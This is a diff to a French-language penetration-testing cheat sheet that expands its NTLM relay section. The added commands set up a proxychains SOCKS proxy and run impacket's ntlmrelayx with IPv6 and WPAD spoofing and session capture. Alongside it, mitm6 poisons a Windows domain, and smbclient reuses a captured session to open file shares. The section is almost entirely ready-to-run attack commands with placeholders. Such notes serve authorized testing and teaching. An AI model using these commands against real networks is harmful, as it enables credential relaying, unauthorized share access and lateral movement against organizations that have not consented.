@@ -48,9 +48,18 @@ sudo pip install --upgrade matplotlib
 Pour relayer les commandes sont les suivantes :&#x20;
 
 ```
-# Terminal 1 (dans le docker impacket)
-ntlmrelayx.py -6 -tf <TARGETS.txt>
+# Modification du fichier de configuration /etc/proxychains4.conf
+socks4 127.0.0.1 1080
+
+# Terminal 1
+impacket-ntlmrelayx.py -6 -wh FAKE.<DOMAIN.LOCAL> -tf <TARGETS.txt> -smb2support -socks -l /tmp
+
+> socks (pour voir les sessions capturées)
 
 # Terminal 2 
 sudo mitm6 -d <DOMAIN.LOCAL>
+
+# Terminal 3
+proxychains smbclient //<IP>/<SHARE> -U <UNE SESSION CAPTUREE>
+> Mettre "pass" quand le mot de passe est demandé
 ```
